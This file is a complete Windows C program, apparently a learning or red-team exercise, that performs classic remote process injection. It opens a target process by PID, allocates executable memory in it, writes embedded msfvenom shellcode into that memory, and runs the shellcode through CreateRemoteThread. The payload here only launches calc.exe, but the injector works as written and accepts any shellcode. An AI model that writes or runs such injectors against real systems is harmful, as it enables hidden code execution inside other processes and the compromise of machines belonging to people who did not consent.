#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>

// Define macros to create status symbols
#define DEFINE_STATUS_SYMBOL(name, value) \
    const char* name = value;

// Use the macros to define status symbols
DEFINE_STATUS_SYMBOL(SUCCESS, "[+]")
DEFINE_STATUS_SYMBOL(ERR, "[-]")
DEFINE_STATUS_SYMBOL(INFORMATION, "[*]")

int main(int argc, char* argv[]) {
    /* declare and initialize some vars for later use */
    PVOID readBuffer = NULL;
    DWORD dwPID = 1, dwTID = 1; // init to a invalid PID (only multiples of 4)
    HANDLE hProcess = NULL, hThread = NULL;
    
    /* 
    * Shellcode to inject into the process 
    * Generated with msfvenom: msfvenom -p windows/x64/exec cmd="C:\Windows\System32\calc.exe" -a x64 -v shellcode --platform windows -f c
    */
    unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00";
    size_t shellcode_size = sizeof(shellcode);

    /* Read input PID */
    if (argc < 2) {
        printf("%s Usage: %s <PID>", ERR, argv[0]);
        return EXIT_FAILURE;
    }
    dwPID = atoi(argv[1]);

    /* Grab the desired process' handle */
    printf("%s Getting a handle to the process... (%ld)\n", INFORMATION, dwPID);
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // Bad from, but will change later
        FALSE,
        dwPID
    );
    if (hProcess == NULL) {
        printf("%s Failed to get a process handle.\n\t- Error: %lx\n", ERR, GetLastError());
        return EXIT_FAILURE;
    }
    // else
    printf("%s Got a process handle.\n\t- 0x%p\n", SUCCESS, hProcess);

    /* Setup memory of process to inject */
    readBuffer = VirtualAllocEx(hProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    /* In the future, change RWX to just RW, then add the ability to execute later on with virtualprotect() */
    printf("%s Allocated %zd bytes into the process.\n", SUCCESS, shellcode_size);

    /* Inject our shellcode into the process' memory */
    if (!WriteProcessMemory(hProcess, readBuffer, shellcode, shellcode_size, NULL)) {
        printf("%s Failed to write to process memory.\n\t-Error Code: %lx\n", ERR, GetLastError());
    }
    printf("%s Successfully injected shellcode into process memory.\n", SUCCESS);

    /* Create a remote thread running in the injection process from injected memory */
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)readBuffer, NULL, 0, &dwTID);

    if (hThread == NULL) {
        printf("%s Failed to create remote thread.\n\t-Error Code: %lx\nExiting...\n", ERR, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Successfully created a remote thread.\n\t-Thread ID: %ld\n\t- 0x%p\n", SUCCESS, dwTID, hProcess);

    /* Wait for thread to finish executing then cleanup. */
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}